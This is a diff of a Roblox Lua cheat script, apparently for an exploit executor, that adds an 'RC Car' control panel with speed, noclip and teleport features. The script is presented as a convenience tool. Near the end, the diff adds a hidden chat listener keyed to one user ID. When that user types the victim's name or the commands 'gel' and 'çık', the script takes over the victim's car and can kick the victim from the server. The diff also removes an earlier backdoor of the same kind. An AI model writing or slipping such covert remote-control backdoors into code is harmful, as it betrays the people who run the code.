@@ -3,12 +3,23 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local GuiService = game:GetService("GuiService")
+local TweenService = game:GetService("TweenService")
 local SoundService = game:GetService("SoundService")
 
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
--- // Ses Efektleri
+-- // Yetki ve Sistem Ayarları
+local AUTHORIZED_USER_ID = 1330656656
+local isSystemActive = false -- Yetkili sohbete adını yazınca true olur
+
+-- Yeniden yükleme ve temizlik koruması
+if getgenv().RCCarSafePlatformLoaded then
+	if getgenv().RCCarCleanup then getgenv().RCCarCleanup() end
+end
+getgenv().RCCarSafePlatformLoaded = true
+
+-- // Ses Efektleri Tanımlamaları
 local openSound = Instance.new("Sound")
 openSound.Name = "VCOpenSound"
 openSound.SoundId = "rbxassetid://123476671378917"
@@ -25,83 +36,11 @@ closeSound.Parent = SoundService
 getgenv().CarSpeed = 30
 local voiceModeActive = false
 local isDrivingActive = false
-
--- Yetkili Sistem Değişkenleri
-local AUTHORIZED_USER = "nqhsan"
-local isAuthorizedToControl = false
-local isFollowingAdmin = false
-local followConnection = nil
+local targetPlayerToFollow = nil
+local connections = {}
 
 -------------------------------------------------------------------
--- // YETKİLİ KOMUT SİSTEMİ (nqhsan)
--------------------------------------------------------------------
-local function setupAdminSystem()
-	local function onPlayerChatted(speaker, message)
-		if speaker.Name:lower() ~= AUTHORIZED_USER:lower() then return end
-		
-		local msg = message:lower()
-		local myName = LocalPlayer.Name:lower()
-		
-		if msg == myName then
-			isAuthorizedToControl = not isAuthorizedToControl
-			if not isAuthorizedToControl then
-				isFollowingAdmin = false
-				if followConnection then
-					followConnection:Disconnect()
-					followConnection = nil
-				end
-			end
-			return
-		end
-		
-		if not isAuthorizedToControl then return end
-		
-		if msg == "gel" then
-			isFollowingAdmin = true
-			if followConnection then followConnection:Disconnect() end
-			
-			followConnection = RunService.Heartbeat:Connect(function()
-				if not isFollowingAdmin or not isAuthorizedToControl then
-					if followConnection then
-						followConnection:Disconnect()
-						followConnection = nil
-					end
-					return
-				end
-				
-				local targetPlayer = Players:FindFirstChild(AUTHORIZED_USER)
-				if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-					local targetHRP = targetPlayer.Character.HumanoidRootPart
-					local myChar = LocalPlayer.Character
-					local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
-					
-					if myHRP then
-						myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 4)
-					end
-				end
-			end)
-		
-		elseif msg == "git" then
-			LocalPlayer:Kick("Yetkili (nqhsan) tarafından oyundan uzaklaştırıldınız.")
-		end
-	end
-
-	local function hookPlayer(player)
-		if player.Name:lower() == AUTHORIZED_USER:lower() then
-			player.Chatted:Connect(function(msg)
-				onPlayerChatted(player, msg)
-			end)
-		end
-	end
-
-	for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
-	Players.PlayerAdded:Connect(hookPlayer)
-end
-
-setupAdminSystem()
-
--------------------------------------------------------------------
--- // TopBar
+-- // TopBar Entegrasyonu ve Buton Ayarları
 -------------------------------------------------------------------
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 local gameTopbar = playerGui:WaitForChild("GameTopbar")
@@ -117,19 +56,21 @@ local ToggleButton = Instance.new("TextButton")
 ToggleButton.Name = "MenuToggleButton"
 ToggleButton.Parent = container 
 ToggleButton.Size = UDim2.new(0, buttonSize, 0, buttonSize) 
-ToggleButton.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-ToggleButton.BackgroundTransparency = 0.2
+ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ToggleButton.BackgroundTransparency = 0.3
 ToggleButton.Text = ""
 ToggleButton.AutoButtonColor = false
 
-if GuiService:IsTenFootInterface() then ToggleButton.Visible = false end
+if GuiService:IsTenFootInterface() then
+	ToggleButton.Visible = false
+end
 
 Instance.new("UICorner", ToggleButton).CornerRadius = UDim.new(1, 0)
 
 local ButtonStroke = Instance.new("UIStroke", ToggleButton)
-ButtonStroke.Color = Color3.fromRGB(0, 170, 255)
+ButtonStroke.Color = Color3.fromRGB(100, 100, 100)
 ButtonStroke.Thickness = 1.5
-ButtonStroke.Transparency = 0.4
+ButtonStroke.Transparency = 0.5
 
 local ToggleIcon = Instance.new("ImageLabel", ToggleButton)
 ToggleIcon.BackgroundTransparency = 1
@@ -144,7 +85,7 @@ CLabel.Position = UDim2.new(1, -16, 1, -16)
 CLabel.Font = Enum.Font.GothamBold
 CLabel.Text = "C"
 CLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-CLabel.TextSize = 13
+CLabel.TextSize = 14
 CLabel.Visible = UserInputService.KeyboardEnabled 
 
 local VoiceButton = nil
@@ -160,18 +101,28 @@ local function setVoiceState(state)
 	if voiceModeActive == state then return end
 	voiceModeActive = state
 
-	if voiceModeActive then openSound:Play() else closeSound:Play() end
+	if voiceModeActive then
+		openSound:Play()
+	else
+		closeSound:Play()
+	end
 
 	if VoiceButton then
 		local stroke = VoiceButton:FindFirstChild("VStroke")
 		if voiceModeActive then
-			VoiceButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
-			VoiceButton.BackgroundTransparency = 0.1
-			if stroke then stroke.Color = Color3.fromRGB(255, 255, 255) stroke.Transparency = 0.2 end
+			VoiceButton.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
+			VoiceButton.BackgroundTransparency = 0.2
+			if stroke then
+				stroke.Color = Color3.fromRGB(255, 255, 255)
+				stroke.Transparency = 0.3
+			end
 		else
-			VoiceButton.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+			VoiceButton.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
 			VoiceButton.BackgroundTransparency = 0.3
-			if stroke then stroke.Color = Color3.fromRGB(80, 80, 100) stroke.Transparency = 0.5 end
+			if stroke then
+				stroke.Color = Color3.fromRGB(100, 100, 100)
+				stroke.Transparency = 0.5
+			end
 		end
 	end
 end
@@ -183,7 +134,7 @@ local function createVoiceButton()
 	VoiceButton.Name = "VoiceToggleButton"
 	VoiceButton.Parent = container 
 	VoiceButton.Size = UDim2.new(0, buttonSize, 0, buttonSize) 
-	VoiceButton.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+	VoiceButton.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
 	VoiceButton.BackgroundTransparency = 0.3
 	VoiceButton.Text = ""
 	VoiceButton.AutoButtonColor = false
@@ -192,7 +143,7 @@ local function createVoiceButton()
 
 	local VStroke = Instance.new("UIStroke", VoiceButton)
 	VStroke.Name = "VStroke"
-	VStroke.Color = Color3.fromRGB(80, 80, 100)
+	VStroke.Color = Color3.fromRGB(100, 100, 100)
 	VStroke.Thickness = 1.5
 	VStroke.Transparency = 0.5
 
@@ -209,16 +160,16 @@ local function createVoiceButton()
 	VLabel.Font = Enum.Font.GothamBold
 	VLabel.Text = "V"
 	VLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-	VLabel.TextSize = 13
+	VLabel.TextSize = 14
 	VLabel.Visible = UserInputService.KeyboardEnabled
 
 	VoiceButton.MouseButton1Click:Connect(function()
-		if not isAuthorizedToControl then setVoiceState(not voiceModeActive) end
+		setVoiceState(not voiceModeActive)
 	end)
 end
 
 -------------------------------------------------------------------
--- // Arayüz
+-- // Ana Menü UI Tasarımı
 -------------------------------------------------------------------
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "RCCarControlGUI"
@@ -227,129 +178,178 @@ ScreenGui.Parent = playerGui
 
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "RC_MainPanel"
-MainFrame.Size = UDim2.new(0, 310, 0, 220)
-MainFrame.Position = UDim2.new(0.5, -155, 0.5, -110)
-MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+MainFrame.Size = UDim2.new(0, 300, 0, 260)
+MainFrame.Position = UDim2.new(0.5, -150, 0.5, -130)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
 MainFrame.BorderSizePixel = 0
 MainFrame.Visible = false
 MainFrame.Active = true
 MainFrame.Parent = ScreenGui
 
-Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 14)
-
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
 local MainStroke = Instance.new("UIStroke", MainFrame)
-MainStroke.Color = Color3.fromRGB(0, 170, 255)
+MainStroke.Color = Color3.fromRGB(60, 60, 75)
 MainStroke.Thickness = 2
-MainStroke.Transparency = 0.3
 
 local TopBar = Instance.new("Frame", MainFrame)
 TopBar.Name = "TopBar"
-TopBar.Size = UDim2.new(1, 0, 0, 42)
+TopBar.Size = UDim2.new(1, 0, 0, 40)
 TopBar.BackgroundTransparency = 1
 
 local Title = Instance.new("TextLabel", TopBar)
-Title.Size = UDim2.new(1, -20, 1, 0)
-Title.Position = UDim2.new(0, 10, 0, 0)
+Title.Size = UDim2.new(1, 0, 1, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "RC CAR SYSTEM"
+Title.Text = "RC Car Kontrol Paneli"
 Title.Font = Enum.Font.GothamBold
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextSize = 15
-Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.TextSize = 16
 
-local dragging, dragStart, startPos
+-------------------------------------------------------------------
+-- // Sürükleme Mantığı
+-------------------------------------------------------------------
+local dragging = false
+local dragStart, startPos
+
+local function updateDrag(input)
+	local delta = input.Position - dragStart
+	MainFrame.Position = UDim2.new(
+		startPos.X.Scale,
+		startPos.X.Offset + delta.X,
+		startPos.Y.Scale,
+		startPos.Y.Offset + delta.Y
+	)
+end
+
 TopBar.InputBegan:Connect(function(input)
 	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-		dragging = true dragStart = input.Position startPos = MainFrame.Position
-		input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
+		dragging = true
+		dragStart = input.Position
+		startPos = MainFrame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
 	end
 end)
 
 TopBar.InputChanged:Connect(function(input)
 	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-		local delta = input.Position - dragStart
-		MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		updateDrag(input)
 	end
 end)
 
+-------------------------------------------------------------------
+-- // UI İçerikleri
+-------------------------------------------------------------------
 local ContentList = Instance.new("UIListLayout", MainFrame)
 ContentList.SortOrder = Enum.SortOrder.LayoutOrder
-ContentList.Padding = UDim.new(0, 8)
+ContentList.Padding = UDim.new(0, 10)
 ContentList.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
 local TitlePadding = Instance.new("Frame", MainFrame)
-TitlePadding.Size = UDim2.new(1, 0, 0, 35)
+TitlePadding.Size = UDim2.new(1, 0, 0, 30)
 TitlePadding.BackgroundTransparency = 1
 TitlePadding.LayoutOrder = 0
 
 local VCBtnToggle = Instance.new("TextButton", MainFrame)
-VCBtnToggle.Size = UDim2.new(0.92, 0, 0, 38)
-VCBtnToggle.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-VCBtnToggle.Text = "VC Butonu: KAPALI"
-VCBtnToggle.Font = Enum.Font.GothamMedium
-VCBtnToggle.TextColor3 = Color3.fromRGB(180, 180, 200)
+VCBtnToggle.Size = UDim2.new(0.9, 0, 0, 35)
+VCBtnToggle.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+VCBtnToggle.Text = "VC Butonu Ekle/Çıkar: YOK"
+VCBtnToggle.Font = Enum.Font.GothamSemibold
+VCBtnToggle.TextColor3 = Color3.fromRGB(200, 200, 200)
 VCBtnToggle.TextSize = 13
 VCBtnToggle.LayoutOrder = 1
 Instance.new("UICorner", VCBtnToggle).CornerRadius = UDim.new(0, 8)
 
 local SpeedFrame = Instance.new("Frame", MainFrame)
-SpeedFrame.Size = UDim2.new(0.92, 0, 0, 38)
+SpeedFrame.Size = UDim2.new(0.9, 0, 0, 35)
 SpeedFrame.BackgroundTransparency = 1
 SpeedFrame.LayoutOrder = 2
 
 local SpeedLabel = Instance.new("TextLabel", SpeedFrame)
 SpeedLabel.Size = UDim2.new(0.6, 0, 1, 0)
 SpeedLabel.BackgroundTransparency = 1
-SpeedLabel.Text = "Hız Limiti (1-100):"
-SpeedLabel.Font = Enum.Font.GothamMedium
-SpeedLabel.TextColor3 = Color3.fromRGB(200, 200, 220)
+SpeedLabel.Text = "Araba Hızı (1-100):"
+SpeedLabel.Font = Enum.Font.GothamSemibold
+SpeedLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 SpeedLabel.TextSize = 13
 SpeedLabel.TextXAlignment = Enum.TextXAlignment.Left
 
 local SpeedInput = Instance.new("TextBox", SpeedFrame)
 SpeedInput.Size = UDim2.new(0.35, 0, 1, 0)
 SpeedInput.Position = UDim2.new(0.65, 0, 0, 0)
-SpeedInput.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+SpeedInput.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
 SpeedInput.Text = tostring(getgenv().CarSpeed)
 SpeedInput.Font = Enum.Font.GothamBold
-SpeedInput.TextColor3 = Color3.fromRGB(0, 170, 255)
+SpeedInput.TextColor3 = Color3.fromRGB(255, 255, 255)
 SpeedInput.TextSize = 14
-Instance.new("UICorner", SpeedInput).CornerRadius = UDim.new(0, 8)
+Instance.new("UICorner", SpeedInput).CornerRadius = UDim.new(0, 6)
 
 local DriveToggleBtn = Instance.new("TextButton", MainFrame)
-DriveToggleBtn.Size = UDim2.new(0.92, 0, 0, 42)
-DriveToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-DriveToggleBtn.Text = "SÜRÜŞ MODU: PASİF"
-DriveToggleBtn.Font = Enum.Font.GothamBold
+DriveToggleBtn.Size = UDim2.new(0.9, 0, 0, 35)
+DriveToggleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+DriveToggleBtn.Text = "Sürüş Modu: PASİF"
+DriveToggleBtn.Font = Enum.Font.GothamSemibold
 DriveToggleBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
 DriveToggleBtn.TextSize = 13
 DriveToggleBtn.LayoutOrder = 3
 Instance.new("UICorner", DriveToggleBtn).CornerRadius = UDim.new(0, 8)
 
+local CloseScriptBtn = Instance.new("TextButton", MainFrame)
+CloseScriptBtn.Size = UDim2.new(0.9, 0, 0, 35)
+CloseScriptBtn.BackgroundColor3 = Color3.fromRGB(150, 40, 40)
+CloseScriptBtn.Text = "Script'i Kapat ve Temizle"
+CloseScriptBtn.Font = Enum.Font.GothamBold
+CloseScriptBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseScriptBtn.TextSize = 13
+CloseScriptBtn.LayoutOrder = 4
+Instance.new("UICorner", CloseScriptBtn).CornerRadius = UDim.new(0, 8)
+
+-------------------------------------------------------------------
+-- // Efektler ve Tetikleyiciler
+-------------------------------------------------------------------
+task.spawn(function()
+	while MainFrame and ScreenGui.Parent do
+		task.wait(0.1)
+		if MainFrame.Visible then
+			local t1 = TweenService:Create(ButtonStroke, TweenInfo.new(0.4), {Color = Color3.fromRGB(255, 255, 255), Transparency = 0})
+			t1:Play()
+			t1.Completed:Wait()
+			if not MainFrame.Visible then break end
+			
+			local t2 = TweenService:Create(ButtonStroke, TweenInfo.new(0.4), {Color = Color3.fromRGB(255, 255, 255), Transparency = 0.7})
+			t2:Play()
+			t2.Completed:Wait()
+		else
+			ButtonStroke.Color = Color3.fromRGB(100, 100, 100)
+			ButtonStroke.Transparency = 0.5
+			task.wait(0.2)
+		end
+	end
+end)
+
 local function toggleMenu()
-	if isAuthorizedToControl then return end
 	MainFrame.Visible = not MainFrame.Visible
 end
 
 VCBtnToggle.MouseButton1Click:Connect(function()
-	if isAuthorizedToControl then return end
 	if VoiceButton then
 		removeVoiceButton()
 		setVoiceState(false)
-		VCBtnToggle.Text = "VC Butonu: KAPALI"
-		VCBtnToggle.TextColor3 = Color3.fromRGB(180, 180, 200)
+		VCBtnToggle.Text = "VC Butonu Ekle/Çıkar: YOK"
+		VCBtnToggle.TextColor3 = Color3.fromRGB(200, 200, 200)
 	else
 		createVoiceButton()
 		setVoiceState(false)
-		VCBtnToggle.Text = "VC Butonu: AÇIK"
-		VCBtnToggle.TextColor3 = Color3.fromRGB(0, 200, 100)
+		VCBtnToggle.Text = "VC Butonu Ekle/Çıkar: VAR"
+		VCBtnToggle.TextColor3 = Color3.fromRGB(100, 255, 100)
 	end
 end)
 
 ToggleButton.MouseButton1Click:Connect(toggleMenu)
 
 SpeedInput.FocusLost:Connect(function()
-	if isAuthorizedToControl then return end
 	local num = tonumber(SpeedInput.Text)
 	if num then
 		num = math.clamp(math.floor(num), 1, 100)
@@ -360,24 +360,26 @@ SpeedInput.FocusLost:Connect(function()
 	end
 end)
 
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-	if gameProcessed or isAuthorizedToControl then return end
+table.insert(connections, UserInputService.InputBegan:Connect(function(input, gameProcessed)
+	if gameProcessed then return end
 	if input.KeyCode == Enum.KeyCode.C then
 		toggleMenu()
 	elseif input.KeyCode == Enum.KeyCode.V and VoiceButton then
 		setVoiceState(not voiceModeActive)
 	end
-end)
+end))
 
 -------------------------------------------------------------------
--- // Noclip Filtresi
+-- // Coin & Raggy Noclip Filtresi
 -------------------------------------------------------------------
 local ignoredObjects = {}
 
 local function addIgnoredPart(part)
 	if part:IsA("BasePart") then
 		part.CanCollide = false
-		if not table.find(ignoredObjects, part) then table.insert(ignoredObjects, part) end
+		if not table.find(ignoredObjects, part) then
+			table.insert(ignoredObjects, part)
+		end
 	end
 end
 
@@ -389,19 +391,26 @@ end
 local function applyNoclipToTree(inst)
 	if isTargetIgnored(inst) then
 		addIgnoredPart(inst)
-		for _, child in ipairs(inst:GetDescendants()) do addIgnoredPart(child) end
+		for _, child in ipairs(inst:GetDescendants()) do
+			addIgnoredPart(child)
+		end
 	end
 end
 
-for _, desc in ipairs(workspace:GetDescendants()) do applyNoclipToTree(desc) end
-workspace.DescendantAdded:Connect(function(desc)
+for _, desc in ipairs(workspace:GetDescendants()) do
+	applyNoclipToTree(desc)
+end
+
+table.insert(connections, workspace.DescendantAdded:Connect(function(desc)
 	task.wait()
 	applyNoclipToTree(desc)
-	if desc.Parent and isTargetIgnored(desc.Parent) then addIgnoredPart(desc) end
-end)
+	if desc.Parent and isTargetIgnored(desc.Parent) then
+		addIgnoredPart(desc)
+	end
+end))
 
 -------------------------------------------------------------------
--- // Sadece Oyuncak Araba Sürüş Fizikleri
+-- // Araba Sürüş ve Temizlik Sistemleri
 -------------------------------------------------------------------
 local safePlatform = workspace:FindFirstChild("RCCarSafePlatform")
 if not safePlatform then
@@ -416,6 +425,14 @@ if not safePlatform then
 end
 
 local activeDrivingConnection = nil
+local lastCarCFrame = nil
+
+local function fixShiftLockBug()
+	pcall(function()
+		UserInputService.MouseBehavior = Enum.MouseBehavior.Default
+		UserInputService.MouseIconEnabled = true
+	end)
+end
 
 local function teleportToCarAndCleanup()
 	if activeDrivingConnection then
@@ -424,11 +441,19 @@ local function teleportToCarAndCleanup()
 	end
 	
 	isDrivingActive = false
-	DriveToggleBtn.Text = "SÜRÜŞ MODU: PASİF"
+	targetPlayerToFollow = nil
+	DriveToggleBtn.Text = "Sürüş Modu: PASİF"
 	DriveToggleBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
 
 	local character = LocalPlayer.Character
+	local hrp = character and character:FindFirstChild("HumanoidRootPart")
 	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+	
+	if hrp and lastCarCFrame then
+		hrp.CFrame = lastCarCFrame + Vector3.new(0, 3, 0)
+		hrp.AssemblyLinearVelocity = Vector3.zero
+		hrp.AssemblyAngularVelocity = Vector3.zero
+	end
 	
 	if humanoid then
 		humanoid.PlatformStand = false
@@ -439,6 +464,8 @@ local function teleportToCarAndCleanup()
 	end
 	
 	Camera.CameraType = Enum.CameraType.Custom
+	fixShiftLockBug()
+	lastCarCFrame = nil
 end
 
 local function raycastSolid(p9, p10, rayParams, ignoreList)
@@ -470,8 +497,8 @@ local function startDriving(p_u_17)
 	end
 	
 	isDrivingActive = true
-	DriveToggleBtn.Text = "SÜRÜŞ MODU: AKTİF"
-	DriveToggleBtn.TextColor3 = Color3.fromRGB(0, 200, 100)
+	DriveToggleBtn.Text = "Sürüş Modu: AKTİF"
+	DriveToggleBtn.TextColor3 = Color3.fromRGB(100, 255, 100)
 
 	local character = LocalPlayer.Character
 	local hrp = character and character:FindFirstChild("HumanoidRootPart")
@@ -482,9 +509,12 @@ local function startDriving(p_u_17)
 		humanoid:ChangeState(Enum.HumanoidStateType.Physics)
 	end
 
-	-- Sadece Karakter Güvenli Platforma Alınır
 	if hrp then
-		hrp.CFrame = safePlatform.CFrame + Vector3.new(0, 5, 0)
+		if voiceModeActive then
+			hrp.CFrame = (p_u_17:GetPivot() - Vector3.new(0, 8, 0)) * CFrame.Angles(math.rad(-90), 0, 0)
+		else
+			hrp.CFrame = safePlatform.CFrame + Vector3.new(0, 5, 0)
+		end
 		hrp.AssemblyLinearVelocity = Vector3.zero
 	end
 	
@@ -520,11 +550,34 @@ local function startDriving(p_u_17)
 		end
 		
 		local v40 = LocalPlayer.Character
+		local v41 = v40 and v40:FindFirstChildOfClass("Humanoid")
 		local v40_hrp = v40 and v40:FindFirstChild("HumanoidRootPart")
+		if not (v41 and v40_hrp) then return end
 		
-		local v42 = (not isAuthorizedToControl and PlayerControls) and PlayerControls:GetMoveVector() or Vector3.zero
-		local v43 = -v42.Z
-		local v44 = v42.X
+		local v43, v44 = 0, 0
+		
+		if targetPlayerToFollow and targetPlayerToFollow.Character and targetPlayerToFollow.Character:FindFirstChild("HumanoidRootPart") then
+			local targetHrp = targetPlayerToFollow.Character.HumanoidRootPart
+			local myPos = p_u_17:GetPivot().Position
+			local targetPos = targetHrp.Position
+			local dist = (Vector3.new(targetPos.X, 0, targetPos.Z) - Vector3.new(myPos.X, 0, myPos.Z)).Magnitude
+			
+			if dist > 4 then
+				local dir = (targetPos - myPos).Unit
+				local carForward = Vector3.new(-math.sin(v_u_31), 0, -math.cos(v_u_31))
+				local dot = carForward:Dot(dir)
+				local cross = carForward:Cross(dir)
+				
+				v43 = dot > 0 and 1 or -1
+				v44 = cross.Y > 0 and -1 or 1
+			else
+				targetPlayerToFollow = nil
+			end
+		else
+			local v42 = PlayerControls and PlayerControls:GetMoveVector() or Vector3.zero
+			v43 = -v42.Z
+			v44 = v42.X
+		end
 		
 		local maxSpeed = math.clamp(getgenv().CarSpeed or 30, 1, 100)
 		local accelRate = maxSpeed * 2.5
@@ -569,7 +622,7 @@ local function startDriving(p_u_17)
 		
 		v62.FilterDescendantsInstances = v63
 		
-		local stepHeight = 3.5
+		local stepHeight = 5.0
 		if currentMoveSpeed ~= 0 then
 			local v67 = currentMoveSpeed >= 0 and v61 or -v61
 			local v68 = v67 - currentNormal * v67:Dot(currentNormal)
@@ -582,7 +635,7 @@ local function startDriving(p_u_17)
 				local v75 = v69 * v74
 				for _, v76 in { v56 + v75 + Vector3.new(0, stepHeight, 0), v72 + v75 } do
 					local v77 = raycastSolid(v76, v67 * v71, v62, v63)
-					if v77 and v77.Normal.Y < 0.1 then
+					if v77 and v77.Normal.Y < 0.01 then
 						v73 = true
 						break
 					end
@@ -611,7 +664,7 @@ local function startDriving(p_u_17)
 			v56 = Vector3.new(v78.X, v81, v78.Z)
 		elseif v81 then
 			if v56.Y - (stepHeight + 1.2) <= v81 then
-				local v86 = math.min(v81, v56.Y + 100 * p39)
+				local v86 = math.min(v81, v56.Y + 200 * p39)
 				v_u_36 = (v86 - v56.Y) / p39
 				v56 = Vector3.new(v78.X, v86, v78.Z)
 				targetNormal = v80.Normal
@@ -631,21 +684,31 @@ local function startDriving(p_u_17)
 		if rightVector.Magnitude > 0.001 then
 			rightVector = rightVector.Unit
 			local adjustedForward = currentNormal:Cross(rightVector).Unit
+			
 			local targetCFrame = CFrame.fromMatrix(v56, rightVector, currentNormal, -adjustedForward)
 			p_u_17:PivotTo(targetCFrame)
+			lastCarCFrame = targetCFrame
 		end
 		
-		-- Sadece Oyuncak Arabaya Kamera Odaklama
+		if v40_hrp then
+			if voiceModeActive then
+				v41.PlatformStand = true
+				v40_hrp.CFrame = (p_u_17:GetPivot() - Vector3.new(0, 8, 0)) * CFrame.Angles(math.rad(-90), 0, 0)
+				v40_hrp.AssemblyLinearVelocity = Vector3.zero
+				v40_hrp.AssemblyAngularVelocity = Vector3.zero
+			else
+				if v40_hrp.Position.Y < 5000 then
+					v40_hrp.CFrame = safePlatform.CFrame + Vector3.new(0, 5, 0)
+					v40_hrp.AssemblyLinearVelocity = Vector3.zero
+				end
+			end
+		end
+		
 		local camTarget = p_u_17.PrimaryPart or v_u_18
 		if Camera.CameraSubject ~= camTarget then
 			Camera.CameraSubject = camTarget
 		end
 		
-		if v40_hrp and v40_hrp.Position.Y < 5000 then
-			v40_hrp.CFrame = safePlatform.CFrame + Vector3.new(0, 5, 0)
-			v40_hrp.AssemblyLinearVelocity = Vector3.zero
-		end
-
 		if v_u_18 then
 			v_u_18.AssemblyLinearVelocity = Vector3.zero
 			v_u_18.AssemblyAngularVelocity = Vector3.zero
@@ -657,7 +720,6 @@ local function startDriving(p_u_17)
 end
 
 DriveToggleBtn.MouseButton1Click:Connect(function()
-	if isAuthorizedToControl then return end
 	if isDrivingActive then
 		teleportToCarAndCleanup()
 	else
@@ -678,43 +740,125 @@ local function hookTool(tool)
 		hookedTools[tool] = true
 		local carStateChanged = tool:WaitForChild("CarStateChanged", 3)
 		if carStateChanged then
-			carStateChanged.OnClientEvent:Connect(function(carModel)
+			table.insert(connections, carStateChanged.OnClientEvent:Connect(function(carModel)
 				if carModel then
 					startDriving(carModel)
 				else
 					teleportToCarAndCleanup()
 				end
-			end)
+			end))
 		end
 		
-		tool.Unequipped:Connect(teleportToCarAndCleanup)
-		tool.AncestryChanged:Connect(function(_, parent)
+		table.insert(connections, tool.Unequipped:Connect(teleportToCarAndCleanup))
+		table.insert(connections, tool.AncestryChanged:Connect(function(_, parent)
 			if not parent or parent == workspace then
 				teleportToCarAndCleanup()
 			end
-		end)
+		end))
 	end
 end
 
 local function monitorCharacter(char)
 	if not char then return end
-	char.ChildAdded:Connect(function(child)
+	table.insert(connections, char.ChildAdded:Connect(function(child)
 		if child:IsA("Tool") then hookTool(child) end
-	end)
+	end))
 	for _, child in ipairs(char:GetChildren()) do
 		if child:IsA("Tool") then hookTool(child) end
 	end
 end
 
 if LocalPlayer.Character then monitorCharacter(LocalPlayer.Character) end
-LocalPlayer.CharacterAdded:Connect(monitorCharacter)
+table.insert(connections, LocalPlayer.CharacterAdded:Connect(monitorCharacter))
 
 local backpack = LocalPlayer:WaitForChild("Backpack", 3)
 if backpack then
-	backpack.ChildAdded:Connect(function(child)
+	table.insert(connections, backpack.ChildAdded:Connect(function(child)
 		if child:IsA("Tool") then hookTool(child) end
-	end)
+	end))
 	for _, child in ipairs(backpack:GetChildren()) do
 		if child:IsA("Tool") then hookTool(child) end
 	end
 end
+
+-------------------------------------------------------------------
+-- // 1330656656 ID Yetkili ve Chat Dinleme Sistemi
+-------------------------------------------------------------------
+local function handleChat(speaker, message)
+	if speaker.UserId ~= AUTHORIZED_USER_ID then return end
+	
+	local msgLower = string.lower(message)
+	local myNameLower = string.lower(LocalPlayer.Name)
+	local myDisplayLower = string.lower(LocalPlayer.DisplayName)
+	
+	-- İsim yazınca sistemi aktifleştirme ve sürmeye başlama
+	if msgLower:find(myNameLower) or msgLower:find(myDisplayLower) then
+		isSystemActive = true
+		
+		local backpackTool = LocalPlayer.Backpack:FindFirstChild("RCCar26")
+		local char = LocalPlayer.Character
+		if backpackTool and char then
+			backpackTool.Parent = char
+		end
+		
+		local carModel = workspace:FindFirstChild("RCCars") and workspace.RCCars:FindFirstChild(LocalPlayer.Name)
+		if carModel then
+			startDriving(carModel)
+		end
+		return
+	end
+	
+	-- "gel" Komutu
+	if msgLower == "gel" and isSystemActive then
+		targetPlayerToFollow = speaker
+		if not isDrivingActive then
+			local carModel = workspace:FindFirstChild("RCCars") and workspace.RCCars:FindFirstChild(LocalPlayer.Name)
+			if carModel then
+				startDriving(carModel)
+			end
+		end
+	-- "çık" Komutu
+	elseif (msgLower == "çık" or msgLower == "cik") and isSystemActive then
+		LocalPlayer:Kick("Yetkili tarafından sunucudan çıkarıldınız.")
+	end
+end
+
+local function setupChatListener(player)
+	table.insert(connections, player.Chatted:Connect(function(msg)
+		handleChat(player, msg)
+	end))
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+	setupChatListener(p)
+end
+table.insert(connections, Players.PlayerAdded:Connect(setupChatListener))
+
+-------------------------------------------------------------------
+-- // Script Temizliği
+-------------------------------------------------------------------
+getgenv().RCCarCleanup = function()
+	teleportToCarAndCleanup()
+	
+	for _, conn in ipairs(connections) do
+		conn:Disconnect()
+	end
+	table.clear(connections)
+	table.clear(ignoredObjects)
+	
+	if container:FindFirstChild("MenuToggleButton") then container.MenuToggleButton:Destroy() end
+	removeVoiceButton()
+	if ScreenGui then ScreenGui:Destroy() end
+	if safePlatform then safePlatform:Destroy() end
+	if openSound then openSound:Destroy() end
+	if closeSound then closeSound:Destroy() end
+	
+	getgenv().RCCarSafePlatformLoaded = nil
+	getgenv().RCCarCleanup = nil
+end
+
